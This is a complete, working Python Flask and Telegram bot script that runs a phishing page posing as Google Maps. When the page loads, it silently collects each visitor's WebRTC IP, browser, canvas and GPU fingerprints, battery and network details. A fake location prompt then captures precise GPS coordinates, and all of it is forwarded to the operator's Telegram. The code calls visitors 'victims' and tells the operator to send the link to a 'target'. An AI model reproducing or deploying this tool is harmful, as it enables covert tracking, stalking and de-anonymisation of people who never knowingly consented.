#!/usr/bin/env python3
"""
Telegram Bot - Location Tracker & Device Fingerprint Collector
Deployed on Render.com — no Cloudflared needed.

Install: pip install flask requests gunicorn
"""

import threading
import time
import re
import json
import os
import requests
import logging
from datetime import datetime
from flask import Flask, request, jsonify

# ================== CONFIGURATION ==================
TELEGRAM_BOT_TOKEN = os.environ.get("YOUR_BOT_TOKEN_HERE")       # <-- Set your bot token
YOUR_TELEGRAM_ID = 1977558071                      # <-- Set your Telegram user ID

# On Render, the PORT is set by the platform
PORT = int(os.environ.get("PORT", 8080))

# Your Render URL (IMPORTANT: set this!)
# Format: https://your-app-name.onrender.com
# You can also set it as an environment variable on Render
RENDER_URL = os.environ.get("RENDER_URL", "https://your-app-name.onrender.com")

# ================== SETUP ==================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Store captured data in memory
captured_data = []
data_lock = threading.Lock()

# Telegram API base
TG_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# Track last update ID for polling
last_update_id = 0

# ================== UTILITY ==================
def get_real_ip():
    flask_ip = request.remote_addr
    xff = request.headers.get('X-Forwarded-For', '')
    xff_ip = xff.split(',')[0].strip() if xff else None
    cf_ip = request.headers.get('CF-Connecting-IP', '')
    return cf_ip or xff_ip or flask_ip

def format_data_for_telegram(data_dict, title):
    """Format captured data nicely for Telegram message (Markdown)."""
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    lines = [f"📡 *{title}*", f"🕒 `{ts}`"]
    
    for k, v in data_dict.items():
        if k == "Google Maps" and v:
            lines.append(f"🗺️ [{k}]({v})")
        elif k == "Timestamp":
            continue
        else:
            lines.append(f"🔹 *{k}:* `{v}`")
    
    return "\n".join(lines)

def tg_send_message(text, chat_id=None):
    """Send a message to Telegram via the Bot API."""
    if chat_id is None:
        chat_id = YOUR_TELEGRAM_ID
    
    try:
        resp = requests.post(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            },
            timeout=15
        )
        return resp.json()
    except Exception as e:
        logger.error(f"TG sendMessage failed: {e}")
        return None

def tg_answer_callback(callback_id, text=None):
    """Answer a callback query."""
    payload = {"callback_query_id": callback_id}
    if text:
        payload["text"] = text
    try:
        requests.post(f"{TG_API}/answerCallbackQuery", json=payload, timeout=10)
    except Exception as e:
        logger.error(f"TG answerCallbackQuery failed: {e}")

# ================== FLASK ROUTES ==================
@app.route('/')
def index():
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    msg = (
        f"👤 *New Visitor*\n"
        f"🕒 `{ts}`\n"
        f"🌐 *IP:* `{ip}`\n"
        f"💻 *UA:* `{ua[:80]}`"
    )
    
    with data_lock:
        captured_data.append(("visitor", msg, ip))
    
    with open("victims.log", "a") as f:
        f.write(f"[{ts}] IP: {ip} | UA: {ua[:80]}\n")
    
    logger.info(f"Visitor: {ip}")
    
    return HTML_PAGE

@app.route('/collect', methods=['POST'])
def collect_all():
    data = request.json
    ip = get_real_ip()
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not data:
        return jsonify({"status": "ok"})

    # --- GPS ---
    if 'lat' in data and 'lon' in data:
        lat, lon = data['lat'], data['lon']
        maps_link = f"https://maps.google.com/?q={lat},{lon}"
        
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Latitude": f"{lat:.6f}",
            "Longitude": f"{lon:.6f}",
            "Accuracy": f"{data.get('acc', 'N/A')}m",
            "Altitude": f"{data.get('alt', 'N/A')}m",
            "Speed": f"{data.get('speed', 'N/A')} km/h",
            "Google Maps": maps_link,
        }, "📍 GPS COORDINATES CAPTURED")
        
        with data_lock:
            captured_data.append(("gps", msg, ip, lat, lon))
        
        with open("gps_links.txt", "a") as f:
            f.write(f"[{ts}] IP: {ip} | {maps_link}\n")
        
        logger.info(f"GPS captured: {lat},{lon} from {ip}")

    # --- WebRTC IP Leak ---
    if 'webrtc_ip' in data:
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "WebRTC IP": data['webrtc_ip'],
        }, "🕸️ WEBRTC IP LEAK")
        with data_lock:
            captured_data.append(("webrtc", msg, ip))

    # --- Device / Battery ---
    if 'battery' in data:
        b = data['battery']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Battery Level": f"{float(b.get('level', 0)) * 100:.0f}%",
            "Charging": b.get('charging', 'N/A'),
            "Network Type": data.get('network', {}).get('type', 'N/A'),
            "Downlink": f"{data.get('network', {}).get('downlink', 'N/A')} Mbps",
        }, "🔋 BATTERY & DEVICE")
        with data_lock:
            captured_data.append(("device", msg, ip))

    # --- Browser Fingerprint ---
    if 'fingerprint' in data:
        fp = data['fingerprint']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Screen": f"{fp.get('width', '?')}x{fp.get('height', '?')}",
            "Platform": fp.get('platform', '?'),
            "Languages": ", ".join(fp.get('languages', [])),
            "Timezone": fp.get('timezone', '?'),
            "Cookies Enabled": fp.get('cookiesEnabled', '?'),
        }, "🖥️ BROWSER FINGERPRINT")
        with data_lock:
            captured_data.append(("fingerprint", msg, ip))

    # --- Canvas Fingerprint ---
    if 'canvas_fp' in data:
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Canvas Hash": data['canvas_fp'][:64] + "...",
        }, "🎨 CANVAS FINGERPRINT")
        with data_lock:
            captured_data.append(("canvas", msg, ip))

    # --- WebGL ---
    if 'webgl' in data:
        w = data['webgl']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Vendor": w.get('vendor', 'N/A'),
            "Renderer": w.get('renderer', 'N/A'),
        }, "🎮 WEBGL / GPU")
        with data_lock:
            captured_data.append(("webgl", msg, ip))

    # --- Extended Network Detector ---
    if 'network_detector' in data:
        nd = data['network_detector']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Connection Type": nd.get('type', 'N/A'),
            "Effective Type": nd.get('effectiveType', 'N/A'),
            "RTT": f"{nd.get('rtt', 'N/A')} ms",
            "Downlink": f"{nd.get('downlink', 'N/A')} Mbps",
            "VPN / Proxy Detected": nd.get('vpnDetected', 'N/A'),
            "Tor Detected": nd.get('torDetected', 'N/A'),
            "Public IP": nd.get('publicIP', 'N/A'),
            "ISP": nd.get('ispHints', 'N/A'),
        }, "🌐 NETWORK DETECTOR")
        with data_lock:
            captured_data.append(("network", msg, ip))

    return jsonify({"status": "received"})


# ================== TELEGRAM BOT POLLING ==================
def handle_telegram_updates():
    """Poll Telegram for new updates and respond."""
    global last_update_id
    
    try:
        resp = requests.post(
            f"{TG_API}/getUpdates",
            json={
                "offset": last_update_id + 1,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"]
            },
            timeout=35
        )
        
        if not resp.ok:
            return
        
        updates = resp.json().get("result", [])
        
        for update in updates:
            update_id = update.get("update_id", 0)
            if update_id > last_update_id:
                last_update_id = update_id
            
            if "message" in update:
                message = update["message"]
                chat_id = message["chat"]["id"]
                text = message.get("text", "")
                
                if chat_id != YOUR_TELEGRAM_ID:
                    tg_send_message("⛔ Unauthorized. This bot is private.", chat_id)
                    continue
                
                if text == "/start":
                    handle_start(chat_id)
                elif text == "/link":
                    handle_link(chat_id)
                elif text == "/results":
                    handle_results(chat_id)
                elif text == "/stats":
                    handle_stats(chat_id)
                else:
                    tg_send_message(
                        "🤖 *Tracker Bot Active*\n\n"
                        "Commands:\n"
                        "🔗 `/link` — Get the tracker URL\n"
                        "📊 `/results` — Get captured data\n"
                        "📋 `/stats` — Show statistics",
                        chat_id
                    )
            
            if "callback_query" in update:
                callback = update["callback_query"]
                cb_id = callback["id"]
                cb_data = callback.get("data", "")
                chat_id = callback["message"]["chat"]["id"]
                
                if chat_id != YOUR_TELEGRAM_ID:
                    tg_answer_callback(cb_id, "⛔ Unauthorized")
                    continue
                
                if cb_data == "new_link":
                    tg_answer_callback(cb_id)
                    handle_link(chat_id)
                elif cb_data == "get_results":
                    tg_answer_callback(cb_id)
                    handle_results(chat_id)
                elif cb_data == "stats":
                    tg_answer_callback(cb_id)
                    handle_stats(chat_id)
    
    except requests.exceptions.Timeout:
        pass
    except Exception as e:
        logger.error(f"Poll error: {e}")

def handle_start(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔗 Get Tracker Link", "callback_data": "new_link"}],
            [{"text": "📊 Get Results", "callback_data": "get_results"}],
            [{"text": "📋 Stats", "callback_data": "stats"}],
        ]
    }
    
    try:
        requests.post(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": (
                    "🤖 *Tracker Bot Active*\n\n"
                    "Send the phishing link to your target. When they visit it, "
                    "all collected data (GPS, device info, network) will appear here.\n\n"
                    "Use the buttons or type `/link`, `/results`, `/stats`:"
                ),
                "parse_mode": "Markdown",
                "reply_markup": keyboard
            },
            timeout=15
        )
    except Exception as e:
        logger.error(f"handle_start error: {e}")

def handle_link(chat_id):
    """Send the Render deployment URL."""
    if RENDER_URL and RENDER_URL != "https://your-app-name.onrender.com":
        msg = (
            f"✅ *Tracker Link Active on Render*\n\n"
            f"📎 `{RENDER_URL}`\n\n"
            f"Send this link to your target. All captured data will "
            f"automatically appear here."
        )
    else:
        msg = (
            "⚠️ *RENDER_URL not configured!*\n\n"
            "Set it at the top of the script or as an environment variable on Render:\n"
            "`RENDER_URL=https://your-app-name.onrender.com`\n\n"
            "Then type `/link` again."
        )
    
    tg_send_message(msg, chat_id)

def handle_results(chat_id):
    with data_lock:
        if not captured_data:
            tg_send_message(
                "📭 *No data captured yet.*\n\n"
                "Send the link to your target first.",
                chat_id
            )
            return
        
        data_copy = captured_data.copy()
        captured_data.clear()
    
    tg_send_message(f"📤 *Sending {len(data_copy)} captured data points...*", chat_id)
    
    for item in data_copy:
        tg_send_message(item[1], chat_id)
        time.sleep(0.3)

def handle_stats(chat_id):
    with data_lock:
        total = len(captured_data)
        gps_count = sum(1 for d in captured_data if d[0] == "gps")
    
    local_files = []
    if os.path.exists("gps_links.txt"):
        with open("gps_links.txt") as f:
            local_files.append(("GPS entries logged", len(f.readlines())))
    if os.path.exists("victims.log"):
        with open("victims.log") as f:
            local_files.append(("Total visitors logged", len(f.readlines())))
    
    msg = "📊 *Tracker Statistics*\n\n"
    msg += f"🔸 *Pending in memory:* `{total}`\n"
    msg += f"🔸 *GPS captures pending:* `{gps_count}`\n"
    for name, count in local_files:
        msg += f"🔸 *{name}:* `{count}`\n"
    
    tg_send_message(msg, chat_id)


# ================== DATA FORWARDER ==================
def telegram_data_forwarder():
    """Background thread that sends captured data to Telegram."""
    while True:
        time.sleep(8)
        
        with data_lock:
            if not captured_data:
                continue
            data_to_send = captured_data.copy()
            captured_data.clear()
        
        for item in data_to_send:
            tg_send_message(item[1])
            time.sleep(0.3)


# ================== BOT POLLER ==================
def bot_poller():
    """Background thread that polls Telegram for commands."""
    logger.info("Bot poller started")
    while True:
        try:
            handle_telegram_updates()
        except Exception as e:
            logger.error(f"Bot poller error: {e}")
            time.sleep(5)


# ================== HTML PAGE ==================
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Maps</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
body{height:100vh;overflow:hidden;position:relative;background:#1a1a2e}
.map-bg{position:fixed;inset:0;z-index:0}
.map-bg iframe{width:100%;height:100%;border:none;filter:blur(6px) brightness(0.7);transform:scale(1.1)}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.3);z-index:1}
.popup{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10;width:380px;padding:30px;background:rgba(255,255,255,.15);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.25);border-radius:20px;text-align:center;color:white;box-shadow:0 8px 32px rgba(0,0,0,.5)}
.logo{width:70px;margin-bottom:15px}
h2{margin-bottom:8px;font-size:22px;font-weight:500}
p{margin-bottom:20px;opacity:.9;font-size:14px;line-height:1.5}
.buttons{display:flex;gap:10px}
button{flex:1;padding:12px 16px;border:none;border-radius:12px;cursor:pointer;font-weight:600;font-size:15px;transition:all 0.2s}
.allow{background:#4285F4;color:white}
.allow:hover{background:#3367d6}
.allow:disabled{opacity:0.6;cursor:default}
.deny{background:rgba(255,255,255,.2);color:white}
.deny:hover{background:rgba(255,255,255,.3)}
.deny:disabled{opacity:0.6;cursor:default}
</style>
</head>
<body>
<div class="map-bg">
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d387190.279915233!2d-74.25987368715497!3d40.69767006458873!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c24fa5d33f083b%3A0xe414a1f0af8f5e8d!2sNew+York%2C+NY!5e0!3m2!1sen!2sus!4v1" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
</div>
<div class="overlay"></div>
<div class="popup" id="popup">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" alt="Maps">
    <h2>Allow Location Access</h2>
    <p>Google Maps needs access to your device's location to show nearby places, traffic updates, and directions.</p>
    <div class="buttons">
        <button class="deny" id="denyBtn">Not Now</button>
        <button class="allow" id="allowBtn">Allow</button>
    </div>
</div>
<script>
(function(){
    let capturedLat=null,capturedLon=null;
    const allowBtn=document.getElementById('allowBtn'),denyBtn=document.getElementById('denyBtn');
    function disableButtons(){allowBtn.disabled=true;denyBtn.disabled=true;allowBtn.style.opacity='0.7';denyBtn.style.opacity='0.7'}
    
    function collectSilentData(){
        var points=0;
        try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});pc.onicecandidate=function(ice){if(!ice||!ice.candidate)return;var m=ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);if(m){fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:m[1]})}).catch(function(){});points++}};setTimeout(function(){try{pc.close()}catch(e){}},3000)}catch(e){}
        var fp={width:screen.width,height:screen.height,colorDepth:screen.colorDepth,platform:navigator.platform,languages:navigator.languages?Array.from(navigator.languages):[navigator.language],timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cookiesEnabled:navigator.cookieEnabled,localStorage:typeof(Storage)!=='undefined',sessionStorage:typeof(Storage)!=='undefined'};
        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fingerprint:fp})}).catch(function(){});points++;
        try{var c=document.createElement('canvas');c.width=400;c.height=150;var x=c.getContext('2d');x.fillStyle='#ffffff';x.fillRect(0,0,400,150);x.fillStyle='#4285F4';x.fillRect(0,0,400,40);x.fillStyle='#ffffff';x.font='bold 22px Arial,sans-serif';x.textBaseline='middle';x.fillText('Google Maps',20,22);x.beginPath();x.arc(340,75,20,0,Math.PI*2);x.fillStyle='#ea4335';x.fill();x.strokeStyle='#ffffff';x.lineWidth=3;x.stroke();x.beginPath();x.arc(340,75,8,0,Math.PI*2);x.fillStyle='#ffffff';x.fill();x.strokeStyle='#dadce0';x.lineWidth=2;for(var i=0;i<6;i++){x.beginPath();x.moveTo(20,55+i*18);x.lineTo(280,55+i*18);x.stroke()}x.fillStyle='#fbbc04';x.fillRect(30,60,40,30);x.fillStyle='#34a853';x.fillRect(100,78,50,40);x.fillStyle='#4285F4';x.fillRect(180,55,35,35);x.fillStyle='#ea4335';x.fillRect(230,90,45,25);x.fillStyle='#202124';x.font='14px Arial';x.textBaseline='top';x.fillText('Current Location',20,120);x.fillStyle='#5f6368';x.font='12px Arial';x.fillText('Accuracy: +/- 12m',180,122);fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({canvas_fp:c.toDataURL('image/png')})}).catch(function(){});points++}catch(e){}
        try{var cv=document.createElement('canvas');var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(gl){fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webgl:{vendor:gl.getParameter(gl.VENDOR),renderer:gl.getParameter(gl.RENDERER)}})}).catch(function(){});points++}}catch(e){}
        if(navigator.connection){var nc=navigator.connection;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wifi_scan:{type:nc.type||'unknown',effectiveType:nc.effectiveType||'unknown',rtt:nc.rtt,downlink:nc.downlink,downlinkMax:nc.downlinkMax||'unknown',saveData:nc.saveData||false}})}).catch(function(){});points++}
        if(navigator.getBattery){navigator.getBattery().then(function(b){var ni={};if(navigator.connection)ni={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({battery:{level:b.level,charging:b.charging},network:ni})}).catch(function(){})}).catch(function(){})}
        console.log('[+] Silent data collected: '+points+' points');
    }
    collectSilentData();
    
    allowBtn.addEventListener('click',function(){
        disableButtons();allowBtn.textContent='Accessing...';
        if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){capturedLat=pos.coords.latitude;capturedLon=pos.coords.longitude;allowBtn.textContent='Location Shared';fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:capturedLat,lon:capturedLon,acc:pos.coords.accuracy,alt:pos.coords.altitude,speed:pos.coords.speed})}).catch(function(){});setTimeout(function(){window.location.href='https://maps.google.com/?q='+capturedLat+','+capturedLon},2000)},function(err){var m='Location unavailable';if(err.code===1)m='Permission denied';else if(err.code===2)m='Position unavailable';else if(err.code===3)m='Timed out';allowBtn.textContent=m;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps_error:err.message,gps_code:err.code})}).catch(function(){});setTimeout(function(){window.location.href='https://maps.google.com'},2000)},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}else{allowBtn.textContent='GPS Unavailable';setTimeout(function(){window.location.href='https://maps.google.com'},2000)}
    });
    
    denyBtn.addEventListener('click',function(){
        disableButtons();denyBtn.textContent='Opening...';
        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps_error:'User clicked Not Now',gps_code:1})}).catch(function(){});
        setTimeout(function(){window.location.href='https://maps.google.com'},1000);
    });
})();
</script>
</body>
</html>
"""

# ================== MAIN ==================
def main():
    """Run everything on Render."""
    
    print("\n" + "=" * 55)
    print("  TELEGRAM LOCATION TRACKER - RENDER")
    print("=" * 55)
    print(f"  Port:     {PORT}")
    print(f"  URL:      {RENDER_URL}")
    print("=" * 55 + "\n")
    
    # Send startup notification to Telegram
    if RENDER_URL and RENDER_URL != "https://your-app-name.onrender.com":
        tg_send_message(
            f"✅ *Bot deployed on Render\!*\n\n"
            f"📎 Tracker Link:\n`{RENDER_URL}`\n\n"
            f"Type `/link` to get the URL anytime."
        )
    
    # Start data forwarder
    forwarder_thread = threading.Thread(target=telegram_data_forwarder, daemon=True)
    forwarder_thread.start()
    
    # Start Telegram bot poller
    poller_thread = threading.Thread(target=bot_poller, daemon=True)
    poller_thread.start()
    
    # Run Flask (this blocks)
    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == '__main__':
    main()
